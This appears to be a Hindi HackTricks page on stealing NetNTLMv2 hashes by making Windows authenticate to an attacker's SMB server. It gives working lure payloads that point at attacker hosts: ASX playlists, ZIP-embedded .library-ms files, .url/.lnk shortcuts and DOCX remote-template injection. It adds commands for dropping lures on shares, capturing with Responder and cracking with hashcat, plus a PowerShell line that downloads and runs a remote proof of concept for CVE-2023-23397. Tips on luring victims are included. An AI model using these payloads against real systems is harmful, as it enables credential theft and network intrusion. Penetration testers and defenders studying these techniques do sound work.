# NTLM creds चुराने के स्थान

{{#include ../../banners/hacktricks-training.md}}

**इन शानदार विचारों को देखें: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — ऑनलाइन Microsoft Word फ़ाइल के download से लेकर ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) में बताए गए विभिन्न तरीके।**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

यदि आप **Explorer में उपयोगकर्ता या scheduled jobs द्वारा ब्राउज़ किए जाने वाले किसी share में लिख सकते हैं**, तो ऐसी फ़ाइलें छोड़ें जिनके metadata में आपका UNC दर्शाया हो (उदा. `\\ATTACKER\share`). फ़ोल्डर रेंडर करने पर **implicit SMB authentication** ट्रिगर होता है और यह आपके listener को **NetNTLMv2** leaks कर देता है।

1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **उन्हें लिखने योग्य शेयर पर डाल दें** (पीड़ित जिस भी फ़ोल्डर को खोलता है):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows एक साथ कई फ़ाइलों तक पहुँच सकता है; Explorer द्वारा पूर्वावलोकन (`BROWSE TO FOLDER`) किए जाने वाले किसी भी आइटम के लिए क्लिक की आवश्यकता नहीं होती।

### Windows Media Player प्लेलिस्ट (.ASX/.WAX)

यदि आप किसी लक्ष्य को आपके नियंत्रित Windows Media Player प्लेलिस्ट को खोलने या पूर्वावलोकन करने के लिए प्रेरित कर सकें, तो आप एंट्री को एक UNC path की ओर इंगित करके Net‑NTLMv2 leak कर सकते हैं। WMP संदर्भित मीडिया को SMB के माध्यम से प्राप्त करने का प्रयास करेगा और स्वतः प्रमाणीकृत करेगा।

उदाहरण payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Collection और cracking प्रवाह:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer .library-ms फ़ाइलों को असुरक्षित तरीके से हैंडल करता है जब वे सीधे ZIP आर्काइव के भीतर से खोली जाती हैं। अगर library definition किसी remote UNC path (e.g., \\attacker\share) की ओर इशारा करती है, तो ZIP के अंदर .library-ms को बस ब्राउज़/लॉन्च करने मात्र से Explorer उस UNC को enumerate करता है और हमलावर की ओर NTLM authentication भेज देता है। इससे NetNTLMv2 प्राप्त होता है जिसे ऑफ़लाइन क्रैक किया जा सकता है या संभावित रूप से relayed।

Minimal .library-ms जो हमलावर के UNC की ओर इशारा करता है
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- उपरोक्त XML के साथ .library-ms फ़ाइल बनाएं (अपने IP/hostname सेट करें).
- इसे ज़िप करें (Windows पर: Send to → Compressed (zipped) folder) और ZIP को लक्ष्य पर पहुँचाएँ.
- एक NTLM capture listener चलाएँ और पीड़ित के ZIP के अंदर से .library-ms खोलने तक प्रतीक्षा करें.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows ने calendar items में extended MAPI property PidLidReminderFileParameter को प्रोसेस किया। यदि वह property किसी UNC path की ओर इशारा करती थी (उदा., \\attacker\share\alert.wav), तो reminder फायर होने पर Outlook SMB share से संपर्क कर देता था, और बिना किसी क्लिक के उपयोगकर्ता का Net‑NTLMv2 leaking हो जाता था। इसे 14 March, 2023 को पैच किया गया था, लेकिन यह legacy/untouched fleets और ऐतिहासिक incident response के लिए अभी भी बहुत प्रासंगिक है।

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener पक्ष:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
नोट
- पीड़ित के पास केवल Outlook for Windows चल रहा होना चाहिए जब रिमाइंडर ट्रिगर हो।
- यह leak Net‑NTLMv2 प्रदान करता है जो offline cracking या relay के लिए उपयुक्त है (pass‑the‑hash नहीं)।

### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer स्वतः शॉर्टकट आइकॉन रेंडर करता है। हालिया शोध से पता चला कि Microsoft के April 2025 के UNC‑icon shortcuts पैच के बाद भी, शॉर्टकट टार्गेट को UNC path पर होस्ट करके और आइकॉन को लोकल रखकर बिना किसी क्लिक के NTLM authentication ट्रिगर करना संभव था (patch bypass assigned CVE‑2025‑50154)। केवल फ़ोल्डर को देखना Explorer को रिमोट लक्ष्य से मेटाडेटा प्राप्त करने का कारण बनता है, जो NTLM को हमलावर के SMB सर्वर पर भेज देता है।

न्यूनतम Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
प्रोग्राम शॉर्टकट payload (.lnk) PowerShell के माध्यम से:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery विचार
- ZIP में shortcut डालें और पीड़ित को उसे ब्राउज़ करने के लिए प्रेरित करें।
- shortcut को उस writable share पर रखें जिसे पीड़ित खोलेगा।
- उसी फ़ोल्डर में अन्य lure files के साथ मिलाएँ ताकि Explorer आइटम का preview दिखाए।

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents एक external template को reference कर सकते हैं। यदि आप attached template को किसी UNC path पर सेट करते हैं, तो document खोलने पर SMB के लिए authentication होगा।

Minimal DOCX relationship बदलाव (inside word/):

1) word/settings.xml को संपादित करें और attached template reference जोड़ें:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels संपादित करें और rId1337 को अपने UNC की ओर इंगित करें:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx में फिर पैक करें और डिलीवर करें। अपने SMB capture listener चलाएँ और open के लिए प्रतीक्षा करें।

NTLM को relaying या abusing करने के post-capture ideas के लिए देखें:

{{#ref}}
README.md
{{#endref}}


## संदर्भ
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
